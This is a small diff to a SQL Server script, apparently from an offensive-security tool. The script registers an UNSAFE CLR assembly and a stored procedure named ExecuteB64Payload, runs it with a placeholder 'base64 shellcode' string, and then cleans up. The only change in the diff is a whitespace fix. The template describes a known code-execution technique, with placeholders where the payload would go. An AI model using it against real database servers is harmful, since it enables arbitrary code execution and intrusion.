@@ -39,7 +39,7 @@ CREATE ASSEMBLY [clr_test] AUTHORIZATION [dbo] FROM 0x00 WITH PERMISSION_SET = U
 GO
 CREATE PROCEDURE [dbo].[clr_exec] @exec NVARCHAR (MAX) AS EXTERNAL NAME [clr_test].[StoredProcedures].[ExecuteB64Payload];
 GO
-EXEC[dbo].[clr_exec] 'base64 shellcode'
+EXEC [dbo].[clr_exec] 'base64 shellcode'
 GO
 drop procedure [dbo].[clr_exec];
 drop assembly [clr_test];
